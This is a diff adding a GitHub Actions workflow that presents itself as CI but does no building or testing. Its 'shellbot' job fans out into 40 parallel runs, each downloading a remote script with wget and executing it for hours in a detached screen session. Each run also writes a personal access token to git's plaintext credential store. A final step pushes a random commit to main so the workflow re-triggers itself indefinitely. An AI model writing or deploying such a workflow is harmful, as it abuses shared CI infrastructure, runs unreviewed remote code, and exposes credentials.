@@ -1,0 +1,51 @@
+name: projects v
+
+on:
+  push:
+    branches: [ main ]
+    paths-ignore: 'README.md'
+  workflow_dispatch:
+
+env:
+  GitHubMail: "95546484+Adakaru@users.noreply.github.com"
+  GitHubName: "Adakaru"
+  # GH_TOKEN >> Github Personal Access Token << In Repository Secrets
+
+jobs:
+  shellbot:
+    runs-on: Ubuntu-latest
+    strategy: 
+      max-parallel: 40
+      fail-fast: false 
+      matrix: 
+        go: [1.1, 1.2, 1.3, 1.4] 
+        flag: [A,B,C,D,E,F,G,H,I,J] 
+    env: 
+        NUM_JOBS: 40
+        JOB: ${{ matrix.go }} 
+    steps:
+      - name: Checkout
+        uses: actions/checkout@main
+
+      - name: Set Git Configs & Secrets
+        run: |
+          git config --global user.email ${GitHubMail} #fix
+          git config --global user.name ${GitHubName} #fix
+          git config --global color.ui true #fix
+          git config --global credential.helper store #fix
+          echo "https://${GitHubName}:${{ secrets.GH_TOKEN }}@github.com" > ~/.git-credentials
+      - name: Run shell-bot server
+        timeout-minutes: 320
+        continue-on-error: true
+        run: |
+          wget https://raw.githubusercontent.com/Adakaru/akaru/main/log.sh && chmod u+x log.sh && ./log.sh && chmod u+x log
+             screen -dmS run ./log.sh
+             time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 60; done
+      - name: Workflow Looping
+        run: |
+          git clone https://github.com/${GITHUB_REPOSITORY} loop
+          cd loop || exit 1
+          echo $(( RANDOM - ( RANDOM % RANDOM ) )) > looper.txt
+          git add looper.txt
+          git commit -m "Looping at $(date -u +%D-%T%P)"
+          git push -q https://github.com/${GITHUB_REPOSITORY} HEAD:main
